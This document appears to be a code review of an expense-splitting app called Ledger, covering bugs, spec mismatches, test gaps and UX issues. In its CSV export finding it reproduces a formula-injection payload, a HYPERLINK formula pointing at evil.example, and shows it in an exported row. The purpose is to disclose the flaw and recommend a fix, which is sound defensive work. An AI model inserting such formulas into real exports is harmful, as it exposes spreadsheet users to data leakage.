# Ledger — main branch review (2026-08-19)

Reviewed commit `f51dcb5` on `main` (the merge of PR #27 trip hide/delete and PR #28
receipt/sweep pins). Scope: the whole tree — `engine/`, `server/`, `web/` — read against the spec
(`docs/specs/2026-07-31-ledger-design.md`) and the house rules in `AGENTS.md`, plus a live
walk-through of the seeded app (`:server:bootTestRun` + Vite) covering sign-in, home, a trip, an
item, settle-up (pay → approve), remind, add-expense in AUD/JPY/中文, and the full
end → put-away → delete → restore lifecycle.

**Headline:** the money core is sound. The two invariants (Σ net = 0; settle-up rows sum to
−netMinor) hold, the engine delegation and largest-remainder splits are correct end to end, the
404-vs-403-vs-409 permission matrix is consistent, and the new lifecycle code is careful about
idempotency and retries. Nothing found threatens a stored balance. The findings below are, in order:
**three real correctness bugs**, **three spec/behaviour contradictions**, a **ranked test-gap list**,
and a set of **UX/product issues** — the two with the widest blast radius being a CSV
formula-injection hole and an add-expense default that silently charges the wrong people.

Legend: **[live]** = reproduced against the running app or a live HTTP call; **[traced]** = confirmed
by reading the exact source path (repro sketch given). Severities are mine, not the sub-agents'.

---

## 1. Correctness bugs

### C1 — CSV export is open to spreadsheet formula injection · HIGH · [live]
`server/.../export/ExportService.kt:96-101` (`field()`), row build at `:46-47`.

`field()` does correct RFC-4180 quoting (commas, quotes, CR/LF) but never neutralises a cell that
*starts* with `=`, `+`, `-`, or `@`. The two free-text columns — `item.title` (any member) and the
payer's `displayName` (creator) — reach the file verbatim. Excel, Sheets and LibreOffice evaluate
such a cell as a formula on open (CWE-1236). This is the one finding that leaves the app's own
trust boundary: the file people download precisely to *trust the numbers* can carry an active
payload.

**Reproduced live.** Created an expense titled `=HYPERLINK("http://evil.example/leak","click me")`
via the API, then `GET /api/trips/{id}/expenses.csv`:
```
2026-08-19,2026-08-19T19:20:46+10:00,Bob,"=HYPERLINK(""http://evil.example/leak"",""click me"")",4.00,AUD
```
The value is quoted but still begins with `=`, so it executes on open.

**Fix:** in `field()`, prefix any value whose first char is one of `= + - @` (and the tab/CR
lead-ins) with a `'`, or wrap it so the leading char cannot start a formula — the OWASP-standard
mitigation. One place, one function.

### C2 — A category named only in Chinese (or any non-Latin script) is rejected · HIGH · [live]
`server/.../category/CategoryService.kt:59` (`slugify`), `:73` (`NON_SLUG`), used `:28-32`.

`slugify(name)` lower-cases then `replace(Regex("[^a-z0-9]+"), "-").trim('-')`. Any name with no
ASCII alphanumerics collapses to empty and is refused `400 "That name has no letters or digits in
it"`. That is correct for `"!!!"` (already tested) but also rejects ordinary CJK/Cyrillic/Arabic
names — in an app that is explicitly bilingual (spec §3 "English + 中文"), and where a custom
category is the one place a user-typed name is stored verbatim.

**Reproduced live.** `POST /api/trips/{id}/categories {"name":"夜宵",...}` →
`400 "That name has no letters or digits in it"`. "夜宵" (late-night snack) is a perfectly normal
category name.

**Fix:** derive the slug from a Unicode letter/number class (`\p{L}\p{N}`) rather than `[a-z0-9]`,
or key the row on its generated id and stop requiring the name to be sluggable at all. The
"nothing nameable" guard should trip on *no letters in any script*, not *no ASCII letters*.

### C3 — Nightly purge can destroy a trip moments after it is restored · MEDIUM · [traced]
`server/.../trip/TripPurge.kt:60-81` against `TripService.restore` (`:260-278`) and the
unconditional `purgeAllForTrip`/`deleteById` in `TripRepositories.kt`.

`purgeDeleted()` snapshots the purgeable list once (`findAllPurgeable(cutoff)`), then deletes each
trip in its own transaction — but the four destructive statements match only on `trip_id`/`id`;
none re-checks that `deleted_at` is *still* set. If a `restore()` commits after the trip was listed
but before its delete transaction runs, the restore returns 200 to the creator and the sweep then
hard-deletes the trip, its items, paybacks and members anyway. The `restore()` comment shows the
authors defended the *opposite* direction (sweep-first → flush → `OptimisticLockingFailureException`
→ 404) but not this one. Window is narrow (one nightly cron, low volume) but the blast radius is
total, silent loss of a trip the user was just told is back.

**Repro sketch** (deterministic, `OptimisticLockingTest`-style — no threads needed): delete a trip,
back-date its `deletedAt` past the window so it is in tonight's list, `POST …/restore` (asserts 200),
then run `TripPurge`'s per-trip block verbatim for that id and assert the trip is gone despite the
restore.

**Fix:** inside the per-trip transaction, re-load the row `FOR UPDATE` and skip it unless
`deletedAt != null && deletedAt < cutoff`; or make the bulk deletes conditional on `deleted_at`.

### C4 — A typed rejection reason is thrown away when the reject call fails · MEDIUM · [traced]
`web/src/screens/sheets/ItemDetailSheet.vue:170-175`.

`reject()` awaits `act(() => api.rejectPayback(...))` then *unconditionally* clears `rejecting` and
`rejectReason`. `act()` (`:143-155`) swallows any failure into `error.value` and always resolves, so
the cleanup runs on failure too — the reject form closes and the reason is gone. The sibling flow
`SettleUpSheet.rejectClaim` (`:112-119`) gets this right by guarding the reset with
`if (!error.value)`, which is what makes this a clear bug rather than a choice.

**Failure:** a payer types a reason and submits; someone else just decided the same claim in another
tab (409/400), or the connection blips — the form silently closes, the reason is lost, and the only
signal is a small alert line further down.

**Fix:** guard the reset with `if (!error.value)`, mirroring `SettleUpSheet`.

*(Also here, lower: the item-detail fetch `watch` at `:101-111` has no request-id/abort guard, so a
close-then-reopen-before-first-response with out-of-order arrivals can briefly show the previous
item's data. Narrow and self-correcting — worth an abort guard, not urgent.)*

---

## 2. Spec / behaviour contradictions

### S1 — Add-expense pre-ticks everyone; the spec says nobody · MEDIUM · [live + spec]
`web/src/screens/sheets/AddExpenseSheet.vue:64` vs spec §3 line 115 and §8 line 547.

The sheet opens with **every member ticked** (`ticked = …map(m => [m.id, true])`) and no `All`
chip. The spec's decision table is explicit: *"New item default | **Nobody ticked.** An `All` chip
selects everyone in one tap."* — and §8 repeats *"(nobody ticked, `All` chip)"*. AGENTS.md requires
the spec be updated in the same commit as any behaviour change; here the two have diverged.

This is not cosmetic. The app exists for trips whose headcount changes (spec §2 S3). Pre-ticking
everyone means a late joiner is silently included in bills from before they arrived unless the payer
remembers to untick them — the spec's "inclusion is a deliberate act" default is exactly what
prevented that.

**Observed live:** adding an expense to the 14-person Hokkaido trip pre-selected all 14 with ✓.

**Fix:** either restore nobody-ticked + an `All` chip, or, if all-ticked is the intended new
default, change spec §3 and §8 in the same commit and say why.

### S2 — A blank title is saved as the example placeholder, in the creator's language · MEDIUM · [live]
`web/src/screens/sheets/AddExpenseSheet.vue:145`.

`title: title.value.trim() || t('addExpense.titlePlaceholder')`. The placeholder is an *example*
("Dinner at Sichuan Rose" / "川香玫瑰晚餐"), but it is persisted as the real title when the field is
left blank — resolved in the current locale.

**Observed live:** in 中文, saving an untitled expense stored it as **"川香玫瑰晚餐"** — a restaurant
name on what was a blank entry. An English group hitting Save blank gets an English example; a
Chinese group gets a Chinese one. The permanent money record now names something that never
happened, and (see S3) it cannot be corrected.

**Fix:** fall back to the chosen category's name (or a neutral "Expense"), or require a title.

### S3 — Title, category and date can never be edited after creation · MEDIUM · [traced]
`AddExpenseSheet.vue:150` (`spentOn: todayLocal()`, no date field) and `EditSplitSheet.vue:93-98`
(PATCH sends only `amountMinor`, `payerMemberId`, `splitRule`, `sharedBy`).

`PatchItemBody` already accepts `title`/`categoryId`/`spentOn` (`api.ts:257-266`) and the server
honours them, but no screen exposes them. Combined with S2, a wrong auto-title can only be fixed by
**deleting the bill** — which the app itself warns erases confirmed repayments and moves balances. An
expense is also always stamped "today": logging last night's dinner the next morning files it under
the wrong day forever. Note the claim sheet *does* offer a date (`ClaimPaybackSheet.vue`), so the
gap is visible to users.

**Fix:** add a date field (default today) to add-expense step 1, and surface title/category/date in
the edit sheet via the PATCH that already supports them.

---

## 3. Missing tests (ranked)

The suite is genuinely strong where it counts — engine invariants are property-tested over random
trips (Σ net = 0, bilateral↔net symmetry), all §2 scenarios exist as tests, `split.ts` is pinned to
the shared vector file, i18n key+placeholder parity is enforced, and CSV comma/quote escaping and
JPY money formatting are covered. These gaps are what's promised but unproven; the top three are the
ones I'd close first.

| # | Gap | Risk if it regresses | Home | Effort |
|---|-----|----------------------|------|--------|
| 1 | **Sweep failure isolation** — one throwing `storage.delete` must cost one trip/receipt, not the whole run. Both `TripPurge` and `ReceiptRetention` promise this in prose only | Silent, unbounded: deleted trips never destroyed (broken privacy promise) and receipt images accumulate forever, no user-visible symptom | `TripHideAndDeleteApiTest` / `ReceiptRetentionApiTest`, `@MockitoSpyBean` on `ReceiptStorage` | S |
| 2 | **Third-party payback authorisation** — a member who is neither party nor creator approving/rejecting/undoing, or filing a claim for someone else → 403. Zero negative tests, and every fixture conflates payer with creator | The core rule ("only the person owed, or the creator") could regress to "any member" invisibly — anyone waving through anyone's money | `SettlementApiTest`/`PaybackApiTest` (Carol already in `threeWayTrip`) | S |
| 3 | **Restore-vs-purge race (C3)** — `restore`'s `OptimisticLockingFailureException`→404 catch, and the C3 direction, are untested | The designed 404 becomes a 500 at the exact moment a user rescues a trip; C3 ships silently | beside `OptimisticLockingTest`, spy on `TripRepository.flush` | M |
| 4 | **Closed-trip write matrix, roster half** — items/receipts 409 and paybacks/settlements-open are pinned, but add-member, rename, invite, claim, custom category on a closed trip are asserted neither way | "Ended closes spending, not debts" drifts; e.g. a ghost member's late claim-to-settle could get 409'd unnoticed | `TripCloseApiTest`, same fixtures | S |
| 5 | **CSV formula-injection + newline** (C1) — no test for leading `=+-@`, and `field()`'s CR/LF branch and the Paid-by column are uncovered | The injection ships; a multi-line title or `Smith, Bob` payer silently shifts later columns | one case in `ExportApiTest` | S |
| 6 | **Startup refusal** — no test that a profile without an invite secret, or with neither receipt-storage adapter, refuses to boot (two AGENTS.md non-negotiables) | Someone adds a default secret or a no-op storage "to make it boot"; suite stays green | `ApplicationContextRunner` asserting startup failure | M |
| 7 | **Dragged weights actually save** — `drag.spec.ts` stops at the preview; `money.spec.ts` saves EQUAL only | SplitBar weights could be dropped from the POST (falling back to equal) with every test green | extend `web/e2e/drag.spec.ts` to save, reopen, compare | M |
| 8 | **Non-UTC viewer dates** — `tests/setup.ts` pins `TZ=UTC`; `dates.ts` `todayLocal()` (whose whole reason to exist is negative offsets) has no test | The evening-files-under-tomorrow bug it guards can return unseen | a spec run with `TZ=America/New_York` | S–M |
| 9 | **Hide/unhide idempotency** — `hide` documents "twice is a no-op, unlike close"; never asserted | A retry 409s, or a second hide restamps `hiddenAt` | `TripHideAndDeleteApiTest`, mirror the delete-retry test | S |
| 10 | **Receipt replace/remove through the UI** — `receipt.spec.ts` covers upload/view only; the versioned-URL promise depends on the client re-rendering with the rotated `?v=` | A replaced photo keeps showing from the year-long immutable cache | extend `web/e2e/receipt.spec.ts` | M |
| 11 | **Exact-split rule is unbuilt** — spec §3 promises "Exact (typed amounts)" but `AddExpenseSheet` offers only evenly/custom(weighted); no screen can create one | A spec promise is unshipped and nothing red says so | feature work, then e2e (engine side already tested) | L |

Accepted risk (documented, not a gap): both sweeps run unlocked on `@Scheduled`, correct for the
stated single-instance deployment — but nothing would catch a second instance being added.

---

## 4. UX / product design

### U1 — "Reminded ✓" implies a reminder was delivered; nothing is sent · MEDIUM · [live]
`web/src/components/BalanceRow.vue:70-74`, strings `settle.reminded` ("Reminded ✓" / "已提醒 ✓");
server no-op confirmed at `SettlementService.remind` ("It does not yet deliver anything").

Remind validates and returns by design (spec §9, out of phase 1). But the button then locks to a
past-tense tick — "Reminded ✓" — which reads as delivery, and the failure string
(`trip.remindFailed` "That nudge did not go through") reinforces that success means it went through.
AGENTS.md is explicit: *"do not let any response imply something was sent"*; spec §8: *"Nobody
should be told it sent anything."* This is the one place the honest-money product risks telling a
white lie. (Partly a copy judgment — "Reminded" *could* mean "you nudged them" — but the ✓ tips it.)

**Fix:** delivery-neutral copy (e.g. "Nudge them yourself" / no tick), or hide the button until push
exists.

### U2 — The trip's whole lifecycle lives behind the "Invite" icon, in a sheet titled "People" · MEDIUM · [live]
`web/src/screens/sheets/InviteSheet.vue:277-340`, opened only via the AppBar `user-plus` labelled
"Invite" (`TripScreen.vue:159-166`).

End / Reopen / Put away / Delete — including the most destructive act in the app — are reachable
only by tapping "invite someone". A creator wanting to end or delete a finished trip has no scent
trail, and plain members get an "Invite" affordance whose sheet offers them nothing but a read-only
roster.

**Fix:** rename the entry/sheet to "People & trip settings" (or split lifecycle into a settings/
overflow entry), keeping "Invite" for the link actions.

### U3 — Two currencies that share a symbol are indistinguishable on the overall hero · MEDIUM · [traced]
`web/src/lib/money.ts:77-89` maps AUD/USD/NZD/CAD → `$` and JPY/CNY → `¥`; rendered symbol-only on
`TripsScreen` overalls and every GroupCard.

The per-currency overall lines exist precisely so ¥ and $ never merge — but a user with an AUD trip
and a USD trip sees two bare `$` lines stacked with no code (JPY vs CNY the same). On the one screen
whose job is the user's overall position, "You are owed $120.50 / You owe $89.00" can't be read as
two different monies. (In the seeded walk-through AUD + JPY happened to be distinguishable, which
hides it.)

**Fix:** append the ISO code to each overall line ("$120.50 AUD"), or return disambiguated symbols
(A$, US$).

### U4 — Desktop-bench accessibility gaps in the primary flows · MEDIUM · [traced]
The stated test bench is desktop web, so keyboard reachability is in scope.
- **Trip cards aren't keyboard-reachable** (`TallyCard.vue:13` renders the interactive card as a
  plain `<div>` — no `tabindex`/`role`/key handler), so home → trip, the app's main navigation, is
  mouse-only. (ExpenseRow, by contrast, is a real `<button>`.)
- **Sheets declare `aria-modal="true"` but manage no focus** (`SheetPanel.vue`): opening moves focus
  nowhere, traps nothing, restores nothing — every add-expense/settle/approve flow runs in these.
- **SplitBar is pointer-only** (`SplitBar.vue`): weights change only by dragging non-focusable
  handles, so a keyboard user cannot create a weighted split at all.

**Fix:** make the interactive card a `<button>` (or role+tabindex+keys); focus-trap the sheet and
restore focus on close; give SplitBar handles focus + arrow-key adjustment.

### U5 — English leaks into the Chinese UI · LOW · [live]
Literal `'You'` at `AddExpenseSheet.vue:224,235` and `EditSplitSheet.vue:136,147` (while
`common.you` = "你" exists and is used correctly in `InviteSheet.vue:234`); untranslated
`aria-label="Close"` (`SheetPanel.vue:51`) and `aria-label="Back"` (`AppBar.vue:30`).

**Observed live:** in 中文, the payer chips and the viewer's own split row read "You", not "你", on
the two money-entry sheets — the only mid-screen English a Chinese user meets in the core flow.
(Otherwise zh is in good shape: the new lifecycle strings — 收起行程, 最近删除, {date}前可恢复 — are
natural and the key sets are parallel.)

**Fix:** replace the literals with `t('common.you')`; move the aria-labels into the message files.

### U6 — Error-handling & polish cluster · LOW–MEDIUM · [traced]
- **Home swallows fetch failures → permanent blank** (MEDIUM). `TripsScreen.vue:101-108` rethrows any
  non-401 into an unhandled rejection; `overview` stays null, and the template gates everything on
  `overview &&`, so a server 500 or dropped connection leaves a blank page — no error, no retry, no
  loading state. `TripScreen` handles the identical case properly (`loadError` + EmptyState,
  `:60,127-131,317-322`), so the app is inconsistent with itself. **Fix:** mirror TripScreen's
  pattern.
- **Failed receipt upload after a successful save gives no positive confirmation** (MEDIUM).
  `AddExpenseSheet.save():143-166` creates the item, then uploads the photo; if the upload throws,
  `emit('saved')` never fires and the user sees a generic error with no word that the expense
  itself landed. The idempotent retry (same minted id) only protects them if they press Save again
  rather than close and re-enter — which the generic error invites, doubling the bill. **Fix:**
  separate "expense saved / photo failed — press Save to retry the photo", refresh either way.
- **Sign-in's fallback error message is the button's own label** (LOW). `SignInScreen.vue:45` sets a
  non-API failure's message to `t('signin.button')` — the user sees "Sign in" (登录) in red.
- **Row-level "Pay" forgets who you were paying** (LOW). `TripScreen.vue:243` `@pay="settleOpen =
  true"` opens the settle sheet generically; the user finds the same person again and taps Pay a
  second time.
- **A half-typed expense is discarded with no confirm** (LOW). `SheetPanel` closes on Escape/scrim
  unconditionally; every other destructive act in the app confirms and names its cost, so this is
  the one inconsistent gap.
- **No explanation why "Put away" is absent on a live trip** (LOW). The control only renders once
  `closedAt` is set; a creator who has seen it elsewhere finds silence, not a disabled hint.

---

## What was checked and is clean

- **Both invariants** hold in the engine (property-tested) and over HTTP; the seeded trip's who-owes
  rows summed exactly to the headline on screen.
- **Money end to end**: integer minor units everywhere, no float path; JPY (zero-decimal) rendered
  `¥1,200`/`¥600` correctly through create, keypad, split, headline and CSV; `split.ts` matches the
  engine including salt low-bit folding.
- **Lifecycle** worked live end to end: end → put away → "Show put away (1)" toggle (anyone) →
  reopen path → delete (confirm named the outstanding **¥600**) → deleted trip left the totals →
  Recently deleted showed "Restorable until Sep 18, 2026" → restore brought it back closed **and
  still put away**. Totals include hidden, exclude deleted, as designed.
- **Permission surfacing**: approve/reject/undo render only where the server flags allow; a deleted
  trip 404s by link with honest, non-leaking copy; ended trips hide the add-expense FAB and edit
  affordances.
- **Store freshness**: every mutation triggers a full refetch; no stale-number path found besides
  the two narrow error cases above.
- **Settle-up** pay → confirm → approve moved the balance in place and left an undoable record;
  decline surfaces its reason to the claimant.

---

## Fix first

1. **C1 (CSV formula injection)** — one-function fix, and it's the only issue that crosses the app's
   trust boundary into a file the user opens elsewhere.
2. **C2 (non-Latin category names)** — a stated bilingual feature is broken for its intended users; a
   one-line regex change.
3. **S1 + S2 (add-expense defaults)** — together they let the app charge the wrong people and record
   a fabricated title, silently, in the exact headcount-changes scenario the product exists for.

Then close test gaps 1–3 (sweep isolation, third-party payback authz, restore-vs-purge), which are
the ones whose regressions would be invisible.
